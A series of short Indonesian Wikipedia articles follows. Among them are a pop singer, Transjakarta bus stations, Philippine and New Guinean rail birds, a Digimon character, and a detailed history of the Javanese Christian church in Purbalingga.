<doc id="1754088" url="https://id.wikipedia.org/wiki?curid=1754088" title="Christian Bhaskara">
Christian Bhaskara

Christian Bhaskara (lahir di Jakarta, 11 Juni 1982) adalah seorang Penyanyi Indonesia, Penulis Lagu dan Musisi. Pada tahun 2007 Christian bergabung dengan Tiket Band] sebagai vokalis utama. Nama Christian Bhaskara mulai di kenal saat lagu yang dibawakan nya bersama Tiket Band yaitu lagu hits "Hanya Kamu Yang Bisa" dan "Kau Buatku Berarti" menjadi lagu yang sangat populer pada tahun 2009. Christian Bhasakara menjadi vokalis Tiket Band dari tahun 2007-2014. Pada tahun 2015, ini Christian Bhaskara memutuskan untuk bersolo karier, dan akan merilis single ciptaan nya yang berjudul ""Aku Bahagia"".

Christian Bhaskara adalah mantan vokalis band Tiket (grup musik) dari tahun 2007 hingga tahun 2014.


Christian Bhaskara memulai karier nya di dunia musik sejak tahun 2004, dengan menyanyi di berbagai cafe kawasan Ibu Kota. Saat itu Christian masih menjalani kuliah nya di Universitas Trisakti. Setelah menyelesaikan study nya, Christian bekerja di salah satu perusahaan Konten Provider sebagai Creative Graphic Design. Pada tahun 2007, Christian bergabung dengan Tiket (grup musik) sebagai vokalis. Christian bersama Opet Alatas, Budhy Haryono dan Arden Wiebowo yang tergabung dalam band pop rock Tiket (grup musik) berhasil meluncurkan 3 album, yakni Transisi, kemudian Transisi versi Repackage, di susul dengan album Gold. Beberapa single dari ke tiga album tersebut berhasil mencuri perhatian masyarakat Indonesia, yaitu Hanya Kamu Yang Bisa, Kau Buat Ku Berarti, dan Jatuh Bangun yang dinyanyikan versi Rock oleh Christian. Tahun 2013, Christian mengundurkan diri menjadi vokalis Tiket (grup musik) karena memiliki banyak kesibukan lainnya. Pada tahun 2015, ini Christian ingin mencoba peruntungan nya di dunia musik dengan bersolo karier.


</doc>
<doc id="1754095" url="https://id.wikipedia.org/wiki?curid=1754095" title="Realisme pascaklasik">
Realisme pascaklasik

Realisme pascaklasik adalah teori hubungan internasional yang dicetuskan oleh Stephen Brooks. Teori ini mengacu pada jenis pemikiran realis yang bisa dibedakan dengan pemikiran neorealis Kenneth Waltz. Realisme pascaklasik mirip dengan realisme defensif.

Berbeda dengan neorealisme, realisme pascaklasik menyatakan bahwa negara tidak perlu selalu memaksimalkan keamanannya. Bukannya berfokus pada kemungkinan konflik, negara justru lebih mengutamakan kemungkinan pecahnya konflik. Karena itu, konflik bisa terjadi apabila keadaan saat itu membuat teknologi militer dan geografi unggul secara ofensif (menyerang) alih-alih defensif (bertahan). Apabila yang terjadi adalah sebaliknya, negara akan mengabaikan keunggulan jangka pendek (pembangunan militer) demi meraih keunggulan jangka panjang (pertumbuhan ekonomi). Negara adalah pencari kekuasaan yang baru memaksimalkan keamanannya ketika keadaan sangat mengancam. Tidak seperti realisme klasik, realisme pascaklasik tidak berasumsi bahwa kekuasaan adalah tujuan akhir, justru kekuasaan memberikan negara fleksibilitas yang tinggi sehingga mampu mencapai tujuan apapun yang dianggap penting oleh negara.


</doc>
<doc id="1754098" url="https://id.wikipedia.org/wiki?curid=1754098" title="Mandar Calayan">
Mandar Calayan

Mandar Calayan ("Gallirallus calayanensis") adalah jenis burung tak terbang dari keluarga mandar, moorhen, dan coot (Rallidae) yang hidup di Pulau Calayan di Filipina. Dikenal oleh penduduk pribumi di pulau tersebut sebagai "piding", hewan tersebut pertama kali diobservasi oleh ornitolog Carmela Española pada Mei 2004 dan penemuan tersebut secara resmi diumumkan pada 16 Agustus 2004.



</doc>
<doc id="1754099" url="https://id.wikipedia.org/wiki?curid=1754099" title="Gerd Heinrich">
Gerd Heinrich

Gerd Hermann Heinrich (7 November 1896 – 17 Desember 1984) adalah seorang etnomolog dan ornitolog kelahiran Berlin yang dikenal karena studi-studinya tentang parasit "Hymenoptera" dari keluarga Ichneumonidae dan deskripsi dari beberapa spesies burung di Sulawesi, Hindia Belanda.

Gerd Hermann Heinrich lahir di Berlin pada 7 November 1896, sebagai putra dari seorang dokter, Dr Herrmann Heinrich, dan Margarethe von Tepper-Ferguson Heinrich


</doc>
<doc id="1754100" url="https://id.wikipedia.org/wiki?curid=1754100" title="Mandar kasuari">
Mandar kasuari

Mandar kasuari ("Megacrex inepta"), adalah sejenis spesies burung dalam keluarga Rallidae, dalam genus monotipik "Megacrex".

Hewan tersebut ditemukan di Indonesia dan Papua Nugini. Habitat alaminya adalah hutan dataran rendah berlumpur subtropis atau tropis, hutan mangrove subtropis atau tropis, dan rawa subtropis atau tropis.



</doc>
<doc id="1754102" url="https://id.wikipedia.org/wiki?curid=1754102" title="SMK Bela Nusantara Cianjur">
SMK Bela Nusantara Cianjur

SMK Bela Nusantara Cianjur adalah salah satu sekolah menengah kejuruan yang terkenal di Kota Cianjur. SMK Belan Nusantara Cianjur dulunya bernama SMK Bina Nusantara, sejak tanggal 01 Oktober 20 atas prakarsa para Yayasan Pendidikan sehingga berubah nama menjadi SMK Bela Nusantara Cianjur yang mempunyai suatu komitmen pada peningkatan kualitas pendidikan di Cianjur dan untuk kepentingan nusa maupun bangsa Indonesia, dengan keputusan izin operasional kepala Kanwil Depdikbud Provinsi Jawa Barat No.339/1.02.1/ot/98.
SMK Bela Nusantara Cianjur hadir di tengah-tengah masyarakat untuk memenuhi tuntutan masyarakat yang mendambakan sosok lulusan SMK yang beriman, bertaqwa, berakhlak mulia, berketerampilan tinggi serta berpengetahuan luas dan langsung dapat bekerja atau melanjutkan ke Perguruan tinggi.
Visi: Terwujudnya SMK yang berkualitas bertaraf Internasional yang lulusanya berakhlakul karimah dan berkemampuan mengembangkan keunggulan lokal serta mampu bersaing di pasar Global.
Misi:
•Memberdayakan potensi sumber daya sekolah dalam mewujudkan pelayanan prima pada masyarakat
•Mengembangkan sarana prasarana pendidikan sesuai standar kebutuhan layanan pendidikan bertarap Nasional dan Internasional
•Mengembangkan system diklat yang berorientasi pada kebutuhan pasar kerja/dunia usaha industry
•Memanpaatkan IT (Information Technology) sebagai media informasi, komunikasi dan media pembelajaran disamping media-media lainnya


</doc>
<doc id="1754103" url="https://id.wikipedia.org/wiki?curid=1754103" title="The King's Doctor">
The King's Doctor

The King's Doctor (; lit. Dokter Kuda) adalah serial televisi Korea Selatan tahun 2012 yang dibintangi oleh Jo Seung-woo dan Lee Yo-won. Drama ini disiarkan di MBC dari dari 1 Oktober 2012 sampai 25 Maret 2013 pada Senin dan Selasa pukul 21:55 selama 50 episode.

Di Indonesia, seri ini disiarkan di Indosiar pada November 2014.

Kehidupan seorang Joseon era kelas rendah dokter hewan yang mengkhususkan diri dalam pengobatan kuda, yang naik menjadi dokter kerajaan yang bertanggung jawab atas kesehatan Raja.




</doc>
<doc id="1754107" url="https://id.wikipedia.org/wiki?curid=1754107" title="SkullGreymon">
SkullGreymon

SkullGreymon adalah digimon yang namanya diambil dari dua kata: "skull" dan "greymon". Menunjukkan bahwa digimon ini adalah bentuk kerangka dari Greymon. Digimon ini digambarkan sebagai simbol sebuah digimon yang menyerahkan segalanya demi mencapai kemenangan sehingga "tidak ada lagi yang tersisa selain tulang belulangnya saja".

SkullGreymon merupakan hasil dari ketidaksabaran Taichi dalam menjadikan Greymon berevolusi ke tingkat berikutnya, sehingga menjadikan Greymon berevolusi secara "Dark Digivolve" menjadi bentuk ini. Setelah Taichi dan kawan-kawan menemukan "crest" atau simbol yang mewakili masing-masing digimon, mereka berharap digimon mereka mampu berevolusi lebih lanjut.

Pada episode ke 16, Taichi dan kawan-kawan diserang sekelompok Greymon di Colosseum, yang memaksa Agumon untuk berevolusi menjadi Greymon. Kalah jumlah dan karena kondisi Greymon yang tidak sehat menyebabkan Taichi tidak puas dan menginginkan Greymon berevolusi lebih lanjut. Namun justru menjadikan Greymon berevolusi menjadi SkullGreymon. SkullGreymon mampu mengalahkan semua Greymon di arena, namun tidak dapat membedakan antara teman dan musuh sehingga ia juga menyerang Taichi dan DigiDestined lainnya. Ia baru berhenti ketika kehabisan energi dan kembali menjadi Koromon.

Kekuatan utama SkullGreymon adalah missile yang ditembakkan dari tulang punggungnya.



</doc>
<doc id="1754108" url="https://id.wikipedia.org/wiki?curid=1754108" title="Pulau Kellett">
Pulau Kellett

Pulau Kellett (Tang Lung Chau, 奇力島, juga 燈籠洲 dalam Tionghoa; artinya "pulau lentera") adalah sebuah bekas pulau dari Pelabuhan Victoria, lepas pantai Titik Timur di Hong Kong. Pulau tersebut sekarang terhubung dengan Pulau Hong Kong di Teluk Causeway setelah reklamasi lahan pada 1969.
Pulau tersebut dikuasai Britania bersama dengan Pulau Hong Kong. Sebuah benteng kecil dibangun disana pada 1841 untuk melindungi bagian timur Pelabuhan Victoria, dan sebuah battery dengan tiga meriam yang ditambahkan pada 1854. Pulau tersebut dinamai pada 1860an (beberapa sumber menyebut 1842) dari nama perwira angkatan laut Sir Henry Kellett. Teluk Kellett dan Gunung Kellett juga dinamai dengan namanya.


</doc>
<doc id="1754110" url="https://id.wikipedia.org/wiki?curid=1754110" title="Kereta api Dang Tuanku">
Kereta api Dang Tuanku

Kereta api Dang Tuanku adalah kereta api yang melayani Padang-Pariaman PP. Kereta api ini adalah kereta api wisata, dan membantu tugas kereta api Sibinuang. Namun kereta api ini berjalan hanya hari Sabtu, dan Minggu. Setiap perjalanannya kereta api ini membawa 5 kereta. Kereta api ini dioperasikan oleh PT. Kereta Api Indonesia dan beroperasi di wilayah Divisi Regional II Sumatra Barat. Sejak 2015, kereta api ini berhenti beroperasi secara reguler.



</doc>
<doc id="1754111" url="https://id.wikipedia.org/wiki?curid=1754111" title="Permata Hijau (Transjakarta)">
Permata Hijau (Transjakarta)

Permata Hijau adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Letjen Supeno, Grogol Utara, Kebayoran Lama, Jakarta Selatan. Stasiun BRT ini berada di Koridor 8 yang membentang dari utara ke selatan Jakarta.




</doc>
<doc id="1754113" url="https://id.wikipedia.org/wiki?curid=1754113" title="Permata Hijau RS Medika (Transjakarta)">
Permata Hijau RS Medika (Transjakarta)

Permata Hijau RS Medika adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Letjen Supeno, Sukabumi Selatan, Kebon Jeruk, Jakarta Barat. Stasiun BRT ini berada di Koridor 8 yang membentang dari utara ke selatan Jakarta.



</doc>
<doc id="1754115" url="https://id.wikipedia.org/wiki?curid=1754115" title="Pos Pengumben (Transjakarta)">
Pos Pengumben (Transjakarta)

Pos Pengumben adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Panjang, Sukabumi Utara, Kebon Jeruk, Jakarta Barat. Stasiun BRT ini berada di Koridor 8 yang membentang dari utara ke selatan Jakarta.



</doc>
<doc id="1754118" url="https://id.wikipedia.org/wiki?curid=1754118" title="Kelapa Dua Sasak (Transjakarta)">
Kelapa Dua Sasak (Transjakarta)

Kelapa Dua Sasak adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Panjang, Kelapa Dua, Kebon Jeruk, Jakarta Barat. Stasiun BRT ini berada di Koridor 8 yang membentang dari utara ke selatan Jakarta.



</doc>
<doc id="1754119" url="https://id.wikipedia.org/wiki?curid=1754119" title="Kebon Jeruk (Transjakarta)">
Kebon Jeruk (Transjakarta)

Kebon Jeruk adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Panjang, Kebon Jeruk, Kebon Jeruk, Jakarta Barat. Stasiun BRT ini berada di Koridor 8 yang membentang dari utara ke selatan Jakarta.




</doc>
<doc id="1754120" url="https://id.wikipedia.org/wiki?curid=1754120" title="T. R. Zeliang">
T. R. Zeliang

T. R. Zeliang (kelahiran 21 Februari 1952) adalah seorang politikus India yang menjadi Ketua Menteri Nagaland, sebuah negara bagian di timur laut India, sejak 2014. Sebagai pemimpin dari Front Rakyat Nagaland, Zeliang mengambil jabatan tersebut dari Ketua Menteri Neiphiu Rio setelah berpindah ke poltik tingkat nasional di Delhi. Zeliang sebelumnya menjabat sebagai Anggota Parlemen, mewakili Nagaland di Rajya Sabha, dewan tinggi Parlemen India.



</doc>
<doc id="1754121" url="https://id.wikipedia.org/wiki?curid=1754121" title="Duri Kepa (Transjakarta)">
Duri Kepa (Transjakarta)

Duri Kepa adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Panjang, Kedoya Selatan, Kebon Jeruk, Jakarta Barat. Stasiun BRT ini berada di Koridor 8 yang membentang dari utara ke selatan Jakarta.



</doc>
<doc id="1754122" url="https://id.wikipedia.org/wiki?curid=1754122" title="Kedoya Assiddiqiyah (Transjakarta)">
Kedoya Assiddiqiyah (Transjakarta)

Kedoya Assiddiqiyah adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Panjang, Kedoya Utara, Kebon Jeruk, Jakarta Barat. Stasiun BRT ini berada di Koridor 8 yang membentang dari utara ke selatan Jakarta.



</doc>
<doc id="1754123" url="https://id.wikipedia.org/wiki?curid=1754123" title="Kedoya Green Garden (Transjakarta)">
Kedoya Green Garden (Transjakarta)

Kedoya Green Garden adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Panjang, Kedoya Utara, Kebon Jeruk, Jakarta Barat. Stasiun BRT ini berada di Koridor 8 yang membentang dari utara ke selatan Jakarta.




</doc>
<doc id="1754126" url="https://id.wikipedia.org/wiki?curid=1754126" title="Gereja Kristen Jawa Purbalingga">
Gereja Kristen Jawa Purbalingga

Gereja Kristen Jawa (GKJ) Purbalingga adalah Gereja Protestan yang berada di Kabupaten Purbalingga, Jawa Tengah yang tergabung dengan Klasis Banyumas Utara dan Sinode Gereja-Gereja Kristen Jawa di Salatiga.

Pada Tahun 1851 dibentuklah Perkumpulan Pekabar Injil yang bernama "Genootschap Voor In-en Uitwendige Zending". Tokoh pendiri perkumpulan tersebut adalah J.P. Esser, Ds. E.W. King, Mr. F.L. Anthing.
Mr. F.L. Anthing adalah seorang Ketua Muda Mahkamah Agung di Jakarta. Ia mendidik beberapa kaum muda untuk menjadi Pekabar Injil diantaranya A.A.M.N Keuchenis ( Residen Tegal ), Johannes Vrede dan Laban yang berasal dari Jawa Tengah. Dan mereka berhasil mendidik Gan Kwee orang Tiong Hoa pertama yang di baptis pada tahun 1856. Gan Kwee seorang penginjil yang giat, mengembara hampir ke seluruh wilayah Jawa, dan pada tahun 1862 singgah ke Banyumas dan Purbalingga dan bertemu dengan Kho Tek San. Mr. F.L. Anthing mengutus Hebron Lelie menggantikan Johannes Vrede. Tidak lama setelah itu, Jonathan Sarijo ditugaskan untuk Penginjilan di wilayah Tegal, dan Leonard ditugaskan untuk wilayah Purbalingga dan Banyumas.
NZG ("Het Nederlandse Zendings Genootschap") yang berdiri pada 19 Desember 1797, pada tahun 1814 mengutus Ds. G. Bruckner ke Semarang, Ds. J. Kam ke Ambon, dan Ds. J.C. Supper ke Jakarta. Pada 3 November 1849 NZG. mengutus Ds. W. Hoezoo untuk melayani di Wilayah Semarang, Ds. W. Hoezoo juga melayani untuk Tegal dan Banyumas.

Di Yogyakarta terdapat keluarga Belanda peranakan yang mempunyai anak bernama Christina Petronella Steven yang lahir pada 17 November 1825, menikah dengan J.C. Phillips. Kemudian antara tahun 1850-1860 J.C. Phillips pindah ke Ambal, Karesidenan Bagelen, Kabupaten Kebumen. Dari Pekabaran Injil Ny. Christiana Petronella Steven di tempat ini, ada 2 orang pria dan 3 wanita yang kemudian dibaptisankan untuk pertama kalinya di Purworejo pada tanggal 27 Desember 1860. J.C Phillips mempunyai saudara perempuan bernama Ny. Van Oostroom Phillips, bertempat di Banyumas, ia seorang pengusaha kain batik. Ia adalah seorang Kristen yang hidup keKristenannya selalu mengabarkan keyakinannya kepada para pekerjanya, sehingga para pekerjanya ingin menerima baptisan, namun sayangnya Residen Banyumas saat itu tidak mengizinkan baptisan dilakukan di wilayahnya. Akhirnya mereka berangkat ke Semarang untuk dibaptiskan pada tanggal 10 Oktober 1958, 9 orang dibaptiskan oleh Ds. W. Hoezoe.

= Sejarah Gereja Kristen Jawa Purbalingga =

5 Mei 1866 dilakukan Baptisan pertama terhadap 10 orang Purbalingga di rumah Kho Tek San oleh Ds. A. Vermeer. 10 orang tersebut adalah Kho Tek San, Asah(Krangean), Abraham (ayah Asah), Elifas alias Gameng dari Kertayasa, Ngaliasar (Karangcengis), Junus (Krangean), Ayah Sem, Adam, Japhet, Jotam. Kho Tek San setelah di baptis berganti nama menjadi Paulus Kho Tek San. Setelah melakukan Baptisan di Purbalingga, Ds. A. Vermeer kembali lagi ke Muaratua. Pekabaran Injil di Purbalingga dilanjutkan oleh Kho Tek San dan Leonard. Pada tahun 1867 jumlah jiwa yang sudah dibaptis menjadi 68 jiwa.

Ds. Aart Vermeer lahir pada 7 Maret 1828 ditahbiskan di Gereja Haarlem pada tanggal 23 Desember 1861 dan membantu pelayanan di Kota Tiel sebelum diutus ke Indonesia. Ds. A. Vermeer menikahi janda Ds. Carl Willem Ottow, Pengabar Injil di Mansinam, Irian pada 5 Februari 1855. di Amsterdam berdiri perkumpulan Pekabaran Injil yang bernama Nederlanse Gereformeerde Zendings Vereniging (NGZV) yang kemudian pada tanggal 6 Mei 1859 memutuskan untuk mengirim Ds. A. Vermeer untuk melayani di wilayah Karesidenan Tegal.

Kedatangan Ds. A. Vermeer ke Tegal pada tanggal 14 Juni 1862 ditandai dengan diberinya Lonceng Gereja yang sampai saat ini masih ada di GKJ Purbalingga. 25 Januari 1863 dilakukan baptisan pertama di Tegal terhadap 37 orang, diantaranya 19 orang dewasa, 18 anak-anak. Gereja Tegal bernama: De Inlandse Christen Gemeente Te Tegal. Atas perjuangan Ds. A. Vermeer dan Residen Keuchenius pada 1864 gereja memperoleh sebidang tanah di Muaratua, yang kemudian Ds. A. Vermeer, Laban dan orang-orang Kristen turut menetap di tempat baru tersebut dan mereka disebut Klein Bethesda.

Pada tahun 1865, wilayah Tegal diserahkan oleh NGZ ke NGZV. Utusan NGZ di Semarang Ds. W. Hoezoo, menyerahkan wilayah Karesidenan Banyumas kepada Ds. A. Vermeer untuk melakukan misi Pekabaran Injil. Untuk melaksanakan tugas tersebut, terlebih dahulu dikirimkanlah Guru Injil bernama Leonard yang kemudian bertemu dengan Kho Tek San. Kho Tek San sebelumnya pernah mengenal Injil melalui Gan Kwee, yang kemudian dilanjutkan pengajaran Injil oleh Leonard. Rumah Kho Tek San selanjutnya dijadikan pos Pekabaran Injil oleh Leonard, ditempat itu banyak sanak saudara dan warga pribumi yang menerima pengajaran Injil. Agar tidak mendapat gangguan terhadap para Pekabar Injil ini, maka NGZV meminta izin dari Pemerintah dan pada tahun 1865 keluarlah izin untuk melakukan Pekabaran Injil di wilayah Karesidenan Banyumas.

Pada Tahun 1866 Ds. A. Vermeer mengunjungi rumah Ny. Van Oostrom Phillips untuk menyelenggarakan Sakramen Perjamuan dan Baptisan. Kemudian singgah juga di rumah Kho Tek San di Purbalingga.

Karena alasan kesehatan, Ds. A. Vermeer meminta pindah kepada NGZV ke Purbalingga dan dikabulkan. Tanggal 10 Oktober 1867 memulai pelayanannya sebagai Pendeta Pertama di Purbalingga, dibantu oleh Leonard, Kho Tek San, dan Dan. Tanggal 5 September 1868 dibukanya gedung gereja dan sekolah sederhana di Kandanggampang, dan pembukaanya dilakukan oleh Jenderal Mr. P. Meyer yang kebetulan sedang meninjau wilayah Purbalingga.

Sepeninggal Ds.A.Vermeer, Gereja di Banyumas umumnya dan Purbalingga khususnya ditangani oleh Ds.R.J.Herstman yang merupakan Pendeta di Pekalongan.

Ini terjadi dari tahun 1892 sampai tahun 1894 saat Ds. R.J.Herstman kembali ke Belanda.

Berdirinya kesatuan Gereja-gereja Gereformer Nederland yang bernama De Gereformeerde Kerken in Nederland pada tahun 1892 memutuskan pekabaran injil haruslah dilaksanakan oleh Gereja bukan oleh perhimpunan/perusahaan/vereniging. Untuk itu NGZV harus menyerahkan pemeliharaan Gereja-gereja di Indonesia kepada De Gereformeerde Kerken in Nederland. Untuk sementara waktu setelah Ds.Herstman kembali ke Belanda, pemeliharaaan Gereja Purbalingga dari tahun 1895 sampai dengan tahun 1901 ditangani oleh Ds.L.Adriaanse yang merupakan Utusan dari Gereja Utrecht dan Nederland, sebagai gereja pengutus hasil sidang Sinode Middelburg.

Ds.G.J.Ruyssenaers merupakan Pendeta utusan pertama dari Sinode Gereja Gereformer di Nederland mulai bertempat di Purbalingga tanggal 4 November 1901.

Saat mulai bekerja di Purbalingga, tenaga-tenaga guru injil suku Jawa seperti Josua Dangin dan Johanes Dangin sangat penting peranannya dalam komunikasi dan mengajarkan kekristenan.

Pada masa ini, jejak pekabaran injil Ds. A.Vermeer masih dilanjutkan terutama dalam mengasuh dan memajukan anak-anak Kristen.

Pada masa itu juga setelah kepindahan Mesah Elifas dari Tegal ke Kertayasa, Jemaat di Kertayasa dan Karangcengis (Bukateja) semakin terpelihara.

Ds.G.J.Ruyssenaers meninggal dunia akibat sakit disentri tanggal 5 Juni 1907.

Sebagai utusan kedua dari Gereja Gereformeerde Rotterdam, Dr.B.J.Esser datang di Purbalingga untuk menggantikan Ds.G.J.Ruyssenaers yang meninggal dunia.

Dia merupakan pendeta lulusan pendidikan tinggi agama Kristen di Nederland.

Pada keluarganya, ia menekankan perlunya pergaulan dengan tata cara orang jawa dalam pengembangan kekristenan di Jawa.

Dr. M.Van Stokkum seorang dokter Kristen datang ke Purbalingga tahun 1910 untuk membangunan rumah sakit.

Sebelumnya Dr. B.J.Esser mempersiapkan tempat, tenaga dsb. Yang diperlukan untuk pembangunan tersebut. Pembangunan rumah sakit dilakukan pada tahun 1911 – 1913 di atas tanah seluas 8 Ha yang terletak di Trenggiling. Rumah sakit tersebut dapat menampung pasien sampai dengan 130 orang.

Beberapa nama yang terlibat dalam pembangunan rumah sakit tersebut yaitu: Marthen Dangin, Hendrik Elifas, Benyamin Emprah, Salmon Asah, Ekker Elifas dari tenaga juru rawat, Tir (tukang kayu dari Bancar) dan Gan Thian Jie (orang Tiong Hoa yang merupakan donatur terbesar untuk pembangunan rumah sakit saat itu).

Pada tahun 1918 terbentuklah majelis gereja Kristen Purbalingga yang pertama. Saat itu jumlah jiwa sebanyak 366.

Setelah itu pada tahun 1925 terdapat 9 guru injil di karesidenan Banyumas yang berasal dari unsur guru dan tenaga kesehatan. Mereka antara lain adalah: Samah Soedarmadi (guru), Misael Radaniman (guru),Sadjan Darmosoemantri (guru), Tiwan Poerwoatmodjo (perawat), Rapen Zakarias (Perawat), Joeseop Marmojoewono (perawat),Sabirin Martousodo (perawat), Kisar Sastroboesono (perawat), Kasim Wahjoesoetjipto (perawat).

Pada masa-masa itu pusat gereja di Purbalingga secara rutin mengirimkan tenaga yang umumnya guru dan juru rawat ke sekolah theologia Yogyakarta untuk mendapatkan pendidikan Theologi.

Pada tahun 1925 kotbah bahasa jawa mulai menggunakan bahasa Krama bukan ngoko lagi.

Jumlah jiwa pada tahun 1925 sampai awal 1926 sebanyak 620 orang.

Atas kesepakatan dari Dr.B.J.Esser dan majelis gereja maka didirikan gedung gereja baru yang dapat menampung jemaat sebanyak 600 orang pada tanggal 23 November 1926.

Total biaya yang dikeluarkan untuk pembangunan tersebut adalah f 8.888.

Pada tahun 1927, diadakan Rapat Klasis pertama Klasis Banyumas yang diselenggarakan di Purbalingga.

Tanggal 3 September 1929 dilakukan Pemanggilan Ds. Samah Soedarmadi sebagai Pendeta Jemaat Gereja Purbalingga.

Beliau merupakan pendeta Jawa pertama di wilayah klasis Banyumas.

Dalam masa itu secara internal pekabaran injil dilakukan melalui sekolah-sekolah, rumah sakit dan melalui media cetak.

Disamping itu mulai muncul pergerakan-pergerakan profesi yang beranggotakan orang Kristen yang secara tidak langsung juga turut mendukung pekabaran injil.

Dalam periode tahun ini perkumpulan kematian Raga Rumanti juga dibentuk yang diketuai oleh Ds.S.Soedarmadi.

Tanggal 2 Juni 1932 sidang sinode pertama dilakukan di Yogyakarta, dengan demikian seluruh gereja di jawa tengah selatan hidup berdasar aturan yang telah ditetapkan dalam sidang sinode dan tidak lagi berpedoman pada gereja gereformeerde di Belanda.

Pada awal tahun 1942 Ds. S.Soedarmadi mengajukan lereh karena alasan keluarga.

Pada masa setelah lerehnya Ds.S.Soedarmadi kehidupan bergereja dilaksanakan oleh majelis gereja dibantu oleh Ds.B.J.Esser yang sudah emiritus. Terkadang dibantu oleh Ds. J.Verkuil dan Ds. A.R.Misael dari Purwokerto.

Ds.J.A.C.Rullman datang dan tinggal di Purbalingga pada periode tahun 1930 sampai dengan tahun 1940 untuk sementara waktu, sebelum kemudian

ke Purwokerto untuk melayani gereja-gereja di wilayah Purwokerto dan Cilacap.

Pada tahun 1942 gereja Purbalingga memanggil pendeta lagi yaitu Ds.Moerwitojo Asmowinangun.

Pada masa ini merupakan masa yang cukup sulit bagi perkembangan Kristen.

Pada tahun 1948 Ds. Moerwitojo Asmowinangun mengajukan berhenti dari jabatan pendeta dan dikabulkan oleh klasis.

Tanggal 8 Maret 1942 Belanda menyerah tanpa syarat kepada Jepang. Hal ini menjadikan segala hal yang berbau Belanda dilarang, termasuk agama Kristen.

Pada tahun 1942 - 1945 perkembangan Pekabaran Injil di jawa sangat terhambat akibat larangang dari Jepang yang saat itu berkuasa.

Segala hal yang berbau Belanda harus digantikan dengan hal-hal yang berasal dari Negeri Jepang, termasuk tentang keyakinan beragama.

Gereja Kristen Indonesia yang jemaatnya kebanyakan merupakan kaum Tiong Hoa yang tadinya bergabung dengan Gereja Jawa di Purbalingga mulai membentuk majelis gereja pada tanggal 1 September 1943.

Hal ini tidak menjadikan gereja menjadi mundur tetapi bahkan makin memperluas jangkauan pekabaran injil di Purbalingga khususnya.

Tanggal 27 Juni 1949 Dilakukan pengujian terhadap Ds.J.Marmojoewono, seorang guru injil dari Gereja Pengalusan di Kelompok Kristen Bobotsari yang berasal dari Krangean, oleh Klasis Banyumas. Akhirnya pada tanggal 20 Juli 1949 Ds.J.Marmojoewono Ditahbiskan sebagai pendeta di Gereja Kristen Jawa Purbalingga. Tanggal 9-10 Maret 1950 Klasis Banyumas bersidang di Gereja Banyumas; hasilnya adalah dipecahnya klasis banyumas menjadi dua yaitu banyumas selatan dan banyumas utara.GKJ Purbalingga tergabung dalam klasis banyumas utara. Tanggal 13 Maret 1950 Kedatangan 10 orang utusan Sinode yang dipimpin Ds.B.Probowinoto. Tujuannya adalah membangkitkan semangat gereja untuk menunaikan tugasnya sesuai perrkembangan jaman yang ada. Beberapa perkembangan kehidupan bergereja dan PI tampak pada masa-masa ini diantaranya yaitu pendidikan Kristen dengan adanya sekolah masehi. Organisasi kegerejaan seperti PWKI mulai menunjukkan jatidirinya. Dan dalam kemajelisan mulai muncul pemikiran-pemikiran untuk menjadi lebih baik dalam kehidupan bergereja. Masa-masa sulit terjadi saat munculnya pemberontakan-pemberontakan di Indonesia, terutama setelah meletusnya pemberontakan PKI. Gereja seringkali mendapat cap pelindung pemberontak. Namun hal itu terjadi hanya sesaat. Hingga awal tahun 1990an, kehidupan bergereja di GKJ Purbalingga semakin dinamis seiring dengan perkembangan yang terjadi di masyarakat. Tanggal 18 Desember 1992, Ds.J.Marmojoewono meninggal dunia.

Beliau merupakan PENDETA KONSULEN untuk jemaat GKJ Purbalingga saat jabatan pendeta kosong atas meninggalnya Ds.J. Marmojoewono, sampai dengan ditahbiskannya pendeta yang melayani di GKJ Purbalingga. Beliau merupakan pendeta tetap yang melayani jemaat di GKJ Arcawinangun, Purwokerto.

Pada tanggal 30 Agustus 1993 dilakukan Pentahbisan terhadap diri Pdt. Tanto Kristiono sebagai Pendeta di GKJ Purbalingga. Pada masanya, kegiatan kesenian cukup mendapat perhatian dalam kehidupan bergereja. Namun pada tanggal 14 November 1995 Pdt.Tanto Kristiono,S.Th meninggalkan GKJ Purbalingga dan mulai melakukan pelayanan di Solo.

Kelompok Penaruban didewasakan menjadi GKJ Penaruban pada tanggal 25 Oktober 1995 dan mulai membentuk majelis gereja.

Beliau merupakan PENDETA KONSULEN untuk jemaat GKJ Purbalingga untuk mengisi kekosongan jabatan pendeta sepeninggal Pdt. TANTO KRISTIONO, sampai ditahbiskannya pendeta baru yang akan melayani di GKJ Purbalingga. Beliau merupakan pendeta tetap yang melayani jemaat di GKJ Klampok, Banjarnegara.

Pemugaran dilakukan dengan pertimbangan usia bangunan yang sudah cukup tua, di samping itu juga ada keinginan untuk lebih memperbesar daya tampung jemaat yang semakin bertambah.

Pada tanggal 28 November 1997 Pdt.Rudiarto Budi Prasetyo,S.Th. ditahbiskan sebagai Pendeta di GKJ Purbalingga. Beliau masih melayani di jemaat GKJ Purbalingga sampai dengan sekarang ini.

Pendeta Dwi Ariyanto,S.Si. Theol. ditahbiskan sebagai Pendeta Kedua GKJ Purbalingga pada tanggal 14 Oktober 2002.

Pentahbisan tersebut dilakukan dengan harapan pemeliharaan Jemaat GKJ Purbalingga dapat semakin lebih baik dengan adanya dua orang pendeta.

Namun adanya dua orang pendeta di GKJ Purbalingga tidak berlangsung lama karena Pdt.Dwi Ariyanto,Ssi.Theol harus meninggalkan pelayanan di GKJ Purbalingga pada bulan Desember 2004. Dan saat ini Beliau melayani jemaat di GKJ Purwodadi.

Sepeninggal Pdt. Dwi Ariyanto,S.Si.Theol. hanya tinggal satu orang pendeta yang melayani jemaat di GKJ Purbalingga. Untuk itu dirasa perlu kembali memanggil seorang pendeta untuk bersama-sama melakukan pelayanan dengan Pdt. Rudiarto Budi Prasetyo, S.Th. Akhirnya pada tanggal 28 Juni 2008 GKJ Purbalingga kembali memiliki dua orang pendeta jemaat dengan ditahbiskannya Pdt. Slamet Waluyo, S.Si.

Sangat besar harapan gereja dengan adanya dua pendeta yang melayani Jemaat, supaya kegiatan pelayanan dan pekabaran Injil dalam lingkup GKJ Purbalingga serta lingkungan di sekitarnya dapat menjadi lebih baik.

